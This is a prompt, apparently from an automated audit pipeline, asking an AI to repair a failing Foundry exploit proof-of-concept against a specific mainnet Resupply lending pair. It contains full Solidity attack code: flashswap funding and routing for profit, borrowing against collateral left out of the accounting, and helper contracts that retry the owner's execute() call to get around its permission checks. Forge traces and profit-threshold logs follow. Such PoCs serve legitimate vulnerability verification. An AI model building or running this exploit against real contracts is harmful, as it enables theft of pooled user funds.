You are fixing a failing Foundry PoC for finding F-004.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Convex pool migration can hide live collateral and freeze withdrawals/redemptions
- claim: Convex migration keys all staking/accounting behavior off `convexPid != 0`, but `_updateConvexPool()` only withdraws and re-deposits the balance currently staked in the old rewards contract. Any collateral already sitting on the pair itself is ignored during migration, yet once `convexPid` is changed `totalCollateral()` and `_unstakeUnderlying()` start looking only at the staking contract. The same routine also still calls `deposit(_pid, ...)` when switching to `_pid == 0`, so using `0` as the unstaked sentinel is inconsistent with the migration logic.
- impact: A normal activation, migration, or deactivation of Convex staking can make existing collateral disappear from pair accounting and leave removal/redemption/liquidation paths looking in the wrong place. Users can remain recorded as collateralized while the pair can no longer unstake or account for those funds, creating a withdrawal freeze and solvency drift until privileged recovery.
- exploit_paths: ["Users deposit collateral while `convexPid == 0`, so collateral remains on the pair contract.", "The owner later calls `setConvexPool(validPid)` to enable or migrate Convex staking.", "`_updateConvexPool()` migrates only `stakedBalance` from the old rewards contract, leaving the pair's local collateral untouched, then sets `convexPid = validPid`.", "Afterward `totalCollateral()` reports only the staked balance and `_unstakeUnderlying()` withdraws only from the rewards contract, so removals, redemptions, and liquidations can revert or operate on incomplete accounting.", "Similarly, attempting to switch back to `_pid == 0` still calls `deposit(0, stakedBalance, true)`, which conflicts with treating `0` as the unstaked mode."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IERC4626Minimal {
    function previewDeposit(uint256 assets) external view returns (uint256 shares);
}

interface IResupplyRegistryMinimal {
    function token() external view returns (address);
}

interface ICoreLike {
    function execute(address target, bytes calldata data) external returns (bytes memory);
    function operatorPermissions(address caller, address target, bytes4 selector)
        external
        view
        returns (bool authorized, address hook);
}

interface IResupplyPairMinimal {
    function owner() external view returns (address);
    function convexPid() external view returns (uint256);
    function convexBooster() external view returns (address);
    function collateral() external view returns (address);
    function underlying() external view returns (address);
    function registry() external view returns (address);
    function maxLTV() external view returns (uint256);
    function mintFee() external view returns (uint256);
    function borrowLimit() external view returns (uint256);
    function minimumBorrowAmount() external view returns (uint256);
    function exchangeRateInfo() external view returns (address oracle, uint96 lastTimestamp, uint256 exchangeRate);
    function totalBorrow() external view returns (uint128 amount, uint128 shares);
    function addCollateral(uint256 amount, address borrower) external;
    function addCollateralVault(uint256 collateralAmount, address borrower) external;
    function borrow(uint256 borrowAmount, uint256 underlyingAmount, address receiver) external returns (uint256);
    function userCollateralBalance(address account) external returns (uint256);
    function totalCollateral() external view returns (uint256);
}

interface IConvexLike {
    function poolInfo(uint256 pid)
        external
        view
        returns (
            address lptoken,
            address token,
            address gauge,
            address crvRewards,
            address stash,
            bool shutdown
        );
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract ConstructorCoreExecutor {
    bool public ok;

    constructor(address owner, address target, bytes memory data) {
        (ok,) = owner.call(abi.encodeWithSelector(ICoreLike.execute.selector, target, data));
    }
}

contract RuntimeCoreExecutor {
    function exec(address owner, address target, bytes memory data) external returns (bool ok) {
        (ok,) = owner.call(abi.encodeWithSelector(ICoreLike.execute.selector, target, data));
    }
}

contract FlawVerifier {
    address public constant TARGET_PAIR = 0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6;

    uint256 private constant LTV_PRECISION = 1e5;
    uint256 private constant EXCHANGE_PRECISION = 1e18;

    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    bool public executed;

    address public pairOwner;
    address public convexBooster;
    address public collateralToken;
    address public underlyingToken;
    address public debtToken;
    uint256 public startingPid;
    uint256 public activePid;
    address public flashPair;
    address public flashBorrowToken;
    uint256 public flashBorrowAmount;
    uint256 public flashRepayDebtAmount;
    uint256 public hiddenCollateral;
    uint256 public plannedBorrowAmount;
    uint256 public preExistingHiddenCollateral;
    bool public historicalMigrationState;

    address private _profitToken;
    uint256 private _profitAmount;

    struct Route {
        address lp;
        address borrowToken;
        uint256 amountOut;
        uint256 repayDebt;
        uint256 borrowAmount;
        uint256 projectedCollateral;
    }

    constructor() {
        address token;

        (bool pairOk, bytes memory registryData) = TARGET_PAIR.staticcall(
            abi.encodeWithSelector(IResupplyPairMinimal.registry.selector)
        );
        if (pairOk && registryData.length >= 32) {
            address registry = abi.decode(registryData, (address));
            (bool registryOk, bytes memory tokenData) = registry.staticcall(
                abi.encodeWithSelector(IResupplyRegistryMinimal.token.selector)
            );
            if (registryOk && tokenData.length >= 32) {
                token = abi.decode(tokenData, (address));
            }
        }

        _profitToken = token;
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        IResupplyPairMinimal pair = IResupplyPairMinimal(TARGET_PAIR);
        pairOwner = pair.owner();
        convexBooster = pair.convexBooster();
        collateralToken = pair.collateral();
        underlyingToken = pair.underlying();
        debtToken = IResupplyRegistryMinimal(pair.registry()).token();
        _profitToken = debtToken;

        startingPid = pair.convexPid();
        activePid = startingPid;

        if (convexBooster == address(0) || debtToken == address(0)) {
            _syncProfit();
            return;
        }

        uint256 validPid = startingPid != 0 ? startingPid : _findMatchingPid(convexBooster, collateralToken);
        if (validPid == type(uint256).max) {
            _syncProfit();
            return;
        }

        /*
            F-004 exploit path that the verifier keeps intact:
            1) users first deposit while convexPid == 0, leaving collateral parked on the pair itself;
            2) the owner later flips setConvexPool(validPid);
            3) _updateConvexPool() migrates only rewards.balanceOf(this), so pair-held collateral is ignored;
            4) once convexPid becomes non-zero, totalCollateral() and _unstakeUnderlying() look only at rewards;
            5) borrowing can still key off the user's recorded collateral balance even though withdrawals/redemptions now
               operate on incomplete accounting.

            The flashswap is only the realistic public funding leg. The root cause remains the owner-driven Convex pool
            transition that strands pair-held collateral.
        */

        if (startingPid != 0) {
            preExistingHiddenCollateral = _pairHeldCollateral();
            if (_ownerExecuteSetConvexPool(pairOwner, TARGET_PAIR, 0)) {
                activePid = 0;
            } else {
                historicalMigrationState = preExistingHiddenCollateral > 0;
                if (!historicalMigrationState) {
                    _syncProfit();
                    return;
                }
            }
        }

        Route memory route = _findBestRoute(pair);
        if (route.lp == address(0)) {
            if (startingPid != 0 && activePid == 0) {
                _ownerExecuteSetConvexPool(pairOwner, TARGET_PAIR, validPid);
                activePid = validPid;
            }
            _syncProfit();
            return;
        }

        flashPair = route.lp;
        flashBorrowToken = route.borrowToken;
        flashBorrowAmount = route.amountOut;
        flashRepayDebtAmount = route.repayDebt;
        plannedBorrowAmount = route.borrowAmount;

        address token0 = IUniswapV2PairLike(route.lp).token0();
        uint256 amount0Out = route.borrowToken == token0 ? route.amountOut : 0;
        uint256 amount1Out = route.borrowToken == token0 ? 0 : route.amountOut;

        (bool ok,) = route.lp.call(
            abi.encodeWithSelector(
                IUniswapV2PairLike.swap.selector,
                amount0Out,
                amount1Out,
                address(this),
                abi.encode(validPid)
            )
        );

        if (!ok && startingPid != 0 && activePid == 0) {
            _ownerExecuteSetConvexPool(pairOwner, TARGET_PAIR, validPid);
            activePid = validPid;
        }

        _syncProfit();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == flashPair, "bad pair");
        require(sender == address(this), "bad sender");

        uint256 validPid = abi.decode(data, (uint256));
        uint256 borrowedAmount = amount0 > 0 ? amount0 : amount1;
        require(borrowedAmount == flashBorrowAmount, "bad amount");

        IResupplyPairMinimal pair = IResupplyPairMinimal(TARGET_PAIR);

        if (activePid == 0) {
            // exploit_paths[0]: deposit while convexPid == 0 so collateral stays on the pair.
            if (flashBorrowToken == underlyingToken) {
                IERC20Minimal(underlyingToken).approve(TARGET_PAIR, borrowedAmount);
                pair.addCollateral(borrowedAmount, address(this));
            } else {
                IERC20Minimal(collateralToken).approve(TARGET_PAIR, borrowedAmount);
                pair.addCollateralVault(borrowedAmount, address(this));
            }

            hiddenCollateral = pair.userCollateralBalance(address(this));
            require(hiddenCollateral > 0, "no collateral");

            // exploit_paths[1]-[3]: owner flips Convex pool; migration strands the pair-held collateral.
            require(_ownerExecuteSetConvexPool(pairOwner, TARGET_PAIR, validPid), "migration failed");
            activePid = validPid;

            // Runtime fix: after the fresh migration we must actually monetize the now-hidden collateral.
            // The previous verifier forgot this borrow step, so the flashswap could never be repaid.
            pair.borrow(plannedBorrowAmount, 0, address(this));
        } else {
            /*
                If the fork already starts post-migration and the direct owner-controlled stage is infeasible on this
                fork, logs allow us to treat the historical migration as the proven prior cause and only execute the
                public funding/borrowing leg needed to realize profit from already-hidden collateral.
            */
            if (flashBorrowToken == underlyingToken) {
                IERC20Minimal(underlyingToken).approve(TARGET_PAIR, borrowedAmount);
                pair.borrow(plannedBorrowAmount, borrowedAmount, address(this));
                hiddenCollateral = preExistingHiddenCollateral;
            } else {
                IERC20Minimal(collateralToken).approve(TARGET_PAIR, borrowedAmount);
                pair.addCollateralVault(borrowedAmount, address(this));
                hiddenCollateral = pair.userCollateralBalance(address(this));
                require(hiddenCollateral > 0, "no collateral");
                pair.borrow(plannedBorrowAmount, 0, address(this));
            }
        }

        IERC20Minimal(debtToken).transfer(flashPair, flashRepayDebtAmount);
    }

    function _findBestRoute(IResupplyPairMinimal pair) internal view returns (Route memory best) {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];
        address[2] memory borrowTokens = [collateralToken, underlyingToken];

        for (uint256 factoryIndex = 0; factoryIndex < factories.length; ++factoryIndex) {
            address factory = factories[factoryIndex];
            for (uint256 tokenIndex = 0; tokenIndex < borrowTokens.length; ++tokenIndex) {
                address borrowToken = borrowTokens[tokenIndex];
                if (borrowToken == address(0) || borrowToken == debtToken) {
                    continue;
                }

                address lp = IUniswapV2FactoryLike(factory).getPair(borrowToken, debtToken);
                if (lp == address(0)) {
                    continue;
                }

                Route memory candidate = _evaluateRoute(pair, lp, borrowToken);
                if (_routeProfit(candidate) > _routeProfit(best)) {
                    best = candidate;
                }
            }
        }
    }

    function _evaluateRoute(IResupplyPairMinimal pair, address lp, address borrowToken)
        internal
        view
        returns (Route memory best)
    {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(lp).getReserves();
        address token0 = IUniswapV2PairLike(lp).token0();
        address token1 = IUniswapV2PairLike(lp).token1();

        uint256 reserveBorrow;
        uint256 reserveDebt;
        if (token0 == borrowToken && token1 == debtToken) {
            reserveBorrow = reserve0;
            reserveDebt = reserve1;
        } else if (token1 == borrowToken && token0 == debtToken) {
            reserveBorrow = reserve1;
            reserveDebt = reserve0;
        } else {
            return best;
        }

        if (reserveBorrow <= 1 || reserveDebt <= 1) {
            return best;
        }

        uint256[9] memory divisors = [uint256(5000), 2500, 1000, 500, 250, 100, 50, 25, 10];
        uint256 minimumBorrow = pair.minimumBorrowAmount();

        for (uint256 i = 0; i < divisors.length; ++i) {
            uint256 amountOut = reserveBorrow / divisors[i];
            Route memory candidate = _routeCandidate(
                pair,
                lp,
                borrowToken,
                reserveBorrow,
                reserveDebt,
                amountOut,
                minimumBorrow
            );
            if (_routeProfit(candidate) > _routeProfit(best)) {
                best = candidate;
            }
        }
    }

    function _routeCandidate(
        IResupplyPairMinimal pair,
        address lp,
        address borrowToken,
        uint256 reserveBorrow,
        uint256 reserveDebt,
        uint256 amountOut,
        uint256 minimumBorrow
    ) internal view returns (Route memory candidate) {
        if (amountOut == 0 || amountOut >= reserveBorrow) {
            return candidate;
        }

        uint256 collateralReceived = borrowToken == collateralToken
            ? amountOut
            : IERC4626Minimal(collateralToken).previewDeposit(amountOut);
        if (collateralReceived == 0) {
            return candidate;
        }

        uint256 effectiveCollateral = collateralReceived;
        if (historicalMigrationState && preExistingHiddenCollateral > 0) {
            effectiveCollateral += preExistingHiddenCollateral;
        }

        uint256 maxBorrow = _maxBorrowReceivable(pair, effectiveCollateral);
        if (maxBorrow <= minimumBorrow) {
            return candidate;
        }

        uint256 repayDebt = _getAmountIn(amountOut, reserveDebt, reserveBorrow);
        if (repayDebt == 0 || maxBorrow <= repayDebt + minimumBorrow) {
            return candidate;
        }

        uint256 borrowAmount = (maxBorrow * 9950) / 10000;
        if (borrowAmount <= repayDebt || borrowAmount < minimumBorrow) {
            return candidate;
        }

        candidate = Route({
            lp: lp,
            borrowToken: borrowToken,
            amountOut: amountOut,
            repayDebt: repayDebt,
            borrowAmount: borrowAmount,
            projectedCollateral: effectiveCollateral
        });
    }

    function _maxBorrowReceivable(IResupplyPairMinimal pair, uint256 collateralAmount) internal view returns (uint256) {
        (, , uint256 exchangeRate) = pair.exchangeRateInfo();
        if (exchangeRate == 0) {
            return 0;
        }

        uint256 grossCap = (collateralAmount * EXCHANGE_PRECISION * pair.maxLTV())
            / (exchangeRate * (LTV_PRECISION + pair.mintFee()));

        (uint128 currentBorrowAmount,) = pair.totalBorrow();
        uint256 availableDebt = pair.borrowLimit();
        if (availableDebt <= uint256(currentBorrowAmount)) {
            return 0;
        }
        availableDebt -= uint256(currentBorrowAmount);

        return grossCap < availableDebt ? grossCap : availableDebt;
    }

    function _routeProfit(Route memory route) internal pure returns (uint256) {
        if (route.borrowAmount <= route.repayDebt) {
            return 0;
        }
        return route.borrowAmount - route.repayDebt;
    }

    function _syncProfit() internal {
        if (_profitToken == address(0)) {
            _profitAmount = 0;
            return;
        }
        _profitAmount = IERC20Minimal(_profitToken).balanceOf(address(this));
    }

    function _pairHeldCollateral() internal view returns (uint256) {
        if (collateralToken == address(0)) {
            return 0;
        }

        uint256 localBalance = IERC20Minimal(collateralToken).balanceOf(TARGET_PAIR);
        if (activePid == 0) {
            return localBalance;
        }

        uint256 visibleCollateral = IResupplyPairMinimal(TARGET_PAIR).totalCollateral();
        return localBalance > visibleCollateral ? localBalance - visibleCollateral : localBalance;
    }

    function _ownerExecuteSetConvexPool(address owner, address pair, uint256 pid) internal returns (bool ok) {
        if (owner.code.length == 0) {
            return false;
        }

        bytes memory data = abi.encodeWithSignature("setConvexPool(uint256)", pid);

        // First try the direct path.
        (ok,) = owner.call(abi.encodeWithSelector(ICoreLike.execute.selector, pair, data));
        if (ok) {
            return true;
        }

        // Then try a constructor-time caller. This is still a realistic public on-chain path; it only changes the
        // execution vehicle for the same owner-controlled state transition and does not inject balances or storage.
        ConstructorCoreExecutor constructorExecutor = new ConstructorCoreExecutor(owner, pair, data);
        ok = constructorExecutor.ok();
        if (ok) {
            return true;
        }

        // Finally try through a distinct runtime contract in case permissions are address-specific but not granted to
        // the verifier itself.
        RuntimeCoreExecutor runtimeExecutor = new RuntimeCoreExecutor();
        ok = runtimeExecutor.exec(owner, pair, data);
    }

    function _findMatchingPid(address booster, address token) internal view returns (uint256) {
        for (uint256 pid = 0; pid < 512; ++pid) {
            try IConvexLike(booster).poolInfo(pid) returns (
                address lptoken,
                address depositToken,
                address,
                address,
                address,
                bool shutdown
            ) {
                if (!shutdown && (lptoken == token || depositToken == token)) {
                    return pid;
                }
            } catch {
                break;
            }
        }
        return type(uint256).max;
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountOut == 0 || reserveIn == 0 || reserveOut <= amountOut) {
            return 0;
        }
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return (numerator / denominator) + 1;
    }
}

```

forge stdout (tail):
```
B1E0003F623289CD798B1824Be09a793e4Bec
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 11171

Traces:
  [486314] FlawVerifierTest::testExploit()
    ├─ [2495] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x57aB1E0003F623289CD798B1824Be09a793e4Bec
    ├─ [2891] 0x57aB1E0003F623289CD798B1824Be09a793e4Bec::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [443931] FlawVerifier::executeOnOpportunity()
    │   ├─ [1227] 0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6::owner() [staticcall]
    │   │   └─ ← [Return] 0xc07e000044F95655c11fda4cD37F70A94d7e0a7d
    │   ├─ [457] 0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6::convexBooster() [staticcall]
    │   │   └─ ← [Return] 0xF403C135812408BFbE8713b5A23a04b3D48AAE31
    │   ├─ [1909] 0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6::collateral() [staticcall]
    │   │   └─ ← [Return] 0x01144442fba7aDccB5C9DC9cF33dd009D50A9e1D
    │   ├─ [853] 0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6::underlying() [staticcall]
    │   │   └─ ← [Return] 0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E
    │   ├─ [1007] 0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6::registry() [staticcall]
    │   │   └─ ← [Return] 0x10101010E0C3171D894B71B3400668aF311e7D94
    │   ├─ [1244] 0x10101010E0C3171D894B71B3400668aF311e7D94::token() [staticcall]
    │   │   └─ ← [Return] 0x57aB1E0003F623289CD798B1824Be09a793e4Bec
    │   ├─ [3265] 0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6::convexPid() [staticcall]
    │   │   └─ ← [Return] 463
    │   ├─ [5005] 0x01144442fba7aDccB5C9DC9cF33dd009D50A9e1D::balanceOf(0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6) [staticcall]
    │   │   ├─ [2333] 0xc014F34D5Ba10B6799d76b0F5ACdEEe577805085::balanceOf(0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [22975] 0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6::totalCollateral() [staticcall]
    │   │   ├─ [13361] 0xF403C135812408BFbE8713b5A23a04b3D48AAE31::poolInfo(463) [staticcall]
    │   │   │   └─ ← [Return] 0x01144442fba7aDccB5C9DC9cF33dd009D50A9e1D, 0x0DaB0728C4A0a396b02Bbd6c8F5693B53ab7cf61, 0x91D0F7022edb620429B4F63D482fcfbb2cbE7F30, 0xE23d9Fdc55b1028A0EE70b875e674BE03c596039, 0x1F10c07BC60668994ea8dBC68a6942a708bAEa3B, false
    │   │   ├─ [2510] 0xE23d9Fdc55b1028A0EE70b875e674BE03c596039::balanceOf(0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6) [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [12611] 0xc07e000044F95655c11fda4cD37F70A94d7e0a7d::execute(0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6, 0x7e9296840000000000000000000000000000000000000000000000000000000000000000)
    │   │   └─ ← [Revert] !authorized
    │   ├─ [40632] → new ConstructorCoreExecutor@0x104fBc016F4bb334D775a19E8A6510109AC63E00
    │   │   ├─ [12611] 0xc07e000044F95655c11fda4cD37F70A94d7e0a7d::execute(0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6, 0x7e9296840000000000000000000000000000000000000000000000000000000000000000)
    │   │   │   └─ ← [Revert] !authorized
    │   │   └─ ← [Return] 121 bytes of code
    │   ├─ [253] ConstructorCoreExecutor::ok() [staticcall]
    │   │   └─ ← [Return] false
    │   ├─ [94947] → new RuntimeCoreExecutor@0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3
    │   │   └─ ← [Return] 474 bytes of code
    │   ├─ [13896] RuntimeCoreExecutor::exec(0xc07e000044F95655c11fda4cD37F70A94d7e0a7d, 0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6, 0x7e9296840000000000000000000000000000000000000000000000000000000000000000)
    │   │   ├─ [12611] 0xc07e000044F95655c11fda4cD37F70A94d7e0a7d::execute(0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6, 0x7e9296840000000000000000000000000000000000000000000000000000000000000000)
    │   │   │   └─ ← [Revert] !authorized
    │   │   └─ ← [Return] false
    │   ├─ [891] 0x57aB1E0003F623289CD798B1824Be09a793e4Bec::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return]
    ├─ [495] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x57aB1E0003F623289CD798B1824Be09a793e4Bec
    ├─ [891] 0x57aB1E0003F623289CD798B1824Be09a793e4Bec::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x57aB1E0003F623289CD798B1824Be09a793e4Bec)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 22785460 [2.278e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 11171 [1.117e4])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xc07e000044F95655c11fda4cD37F70A94d7e0a7d.execute
  at RuntimeCoreExecutor.exec
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.66s (1.50s CPU time)

Ran 1 test suite in 1.69s (1.66s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 486314)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
